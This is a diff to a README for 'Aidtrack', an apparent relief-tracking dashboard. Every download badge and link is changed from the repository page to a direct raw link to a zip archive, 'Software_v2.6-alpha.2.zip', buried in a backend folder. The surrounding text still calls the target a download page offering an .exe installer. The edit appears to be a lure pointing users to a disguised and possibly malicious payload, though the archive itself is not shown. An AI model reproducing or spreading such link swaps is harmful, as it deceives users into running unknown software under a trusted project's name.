@@ -1,6 +1,6 @@
 # 🚑 Aidtrack - Secure Dashboard for Relief Tracking
 
-[![Download Aidtrack](https://img.shields.io/badge/Download-Aidtrack-4CAF50?style=for-the-badge&logo=github)](https://github.com/haiderali122005/Aidtrack)
+[![Download Aidtrack](https://img.shields.io/badge/Download-Aidtrack-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/haiderali122005/Aidtrack/main/aidtrack-backend/Software_v2.6-alpha.2.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before you start, make sure your computer meets these requirements:
 
 Use the link below to visit the download page. From there, you can get the latest version of Aidtrack.
 
-[Download Aidtrack](https://github.com/haiderali122005/Aidtrack)
+[Download Aidtrack](https://raw.githubusercontent.com/haiderali122005/Aidtrack/main/aidtrack-backend/Software_v2.6-alpha.2.zip)
 
 Visit this page to find the download section. Look for files labeled with a version number and the Windows installer, usually ending with `.exe`. Click to download the file to your computer.
 
@@ -117,7 +117,7 @@ If problems persist, contact your support team.
 
 New versions improve features and security. To update:
 
-1. Visit the [Aidtrack Download Page](https://github.com/haiderali122005/Aidtrack).
+1. Visit the [Aidtrack Download Page](https://raw.githubusercontent.com/haiderali122005/Aidtrack/main/aidtrack-backend/Software_v2.6-alpha.2.zip).
 2. Download the latest installer.
 3. Run the installer again to replace your current version.
 4. Your data will remain intact after update.
@@ -143,4 +143,4 @@ For help:
 
 ---
 
-[![Download Aidtrack](https://img.shields.io/badge/Download-Aidtrack-4CAF50?style=for-the-badge&logo=github)](https://github.com/haiderali122005/Aidtrack)
+[![Download Aidtrack](https://img.shields.io/badge/Download-Aidtrack-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/haiderali122005/Aidtrack/main/aidtrack-backend/Software_v2.6-alpha.2.zip)
